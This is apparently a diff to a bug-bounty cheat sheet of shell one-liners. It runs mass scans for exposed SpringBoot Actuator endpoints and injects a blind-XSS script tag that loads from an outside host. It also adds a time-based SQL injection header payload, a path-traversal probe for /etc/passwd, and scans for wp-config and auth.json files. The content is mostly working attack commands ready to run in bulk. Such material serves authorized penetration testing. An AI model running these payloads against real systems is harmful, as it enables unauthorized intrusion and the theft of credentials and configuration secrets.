@@ -80,15 +80,15 @@ cat params.txt | qsreplace "http://$1" | rush -j40 'if curl -skL "{}" -o /dev/nu
 
 ## SpringBoot Actuator Check One Liner on domains:
 
-cat live-domains | rush -j40 'if curl -skI -m 10 "{}/env" | grep -i "x-application-context" || curl -sk -m 10 "{}/actuator/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/actuator" | grep -q '{"_links":{"self"' || curl -sk -m 10 "{}/actuator/configprops" | grep -q "org.springframework.boot.actuate\|beans" || curl -sk -m 10 "{}/configprops" | grep -q "org.springframework.boot.actuate\|beans"; then echo "SpringBoot Actuator Found on {}"; fi' &
+cat live-domains | parallel -j40 'if curl -skI -m 10 "{}/env" | grep -i "x-application-context" || curl -sk -m 10 "{}/actuator/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/actuator" | grep -q '{"_links":{"self"' || curl -sk -m 10 "{}/actuator/configprops" | grep -q "org.springframework.boot.actuate\|beans" || curl -sk -m 10 "{}/configprops" | grep -q "org.springframework.boot.actuate\|beans"; then echo "SpringBoot Actuator Found on {}"; fi' &
 
 
-## cat params.txt | rush -j40 'if curl -skI -m 10 "{}" | grep -i "x-application-context"; then echo "SpringBoot application context header Found on {}"; fi'
+## cat params.txt | parallel -j40 'if curl -skI -m 10 "{}" | grep -i "x-application-context"; then echo "SpringBoot application context header Found on {}"; fi'
 
 
 ## Blind XSS:
 
-cat urls.txt | qsreplace '"><script src=https://vijaysutar.bxss.in></script>' | rush -j40 'curl -sk "{}" -o /dev/null'
+cat urls.txt | qsreplace '"><script src=https://vijaysutar.bxss.in></script>' | parallel -j40 'curl -sk "{}" -o /dev/null'
 
 
 ## Reflection Check (XSS) on one domain by extracting Hidden params
@@ -142,6 +142,31 @@ cat host.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -path /web-cons
 ## Read DS_store:
 
 xxd -p /home/vijay/Desktop/DS_Store | sed 's/00//g' | tr -d '\n' | sed 's/\([0-9A-F]\{2\}\)/0x\1 /g' | xxd -r -p | strings | sed 's/ptb[LN]ustr//g'
+
+
+## Header based blind SQL injection:
+
+cat sub.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+
+## NGINX Path Traversal
+
+httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
+
+## WP-Config Oneliner
+
+cat sub.txt | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
+
+## Extract Sensitive Informations on /auth.json Endpoint.
+
+cat sub.txt | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003
+
+
+
+
+
+
+
+
 
 
 
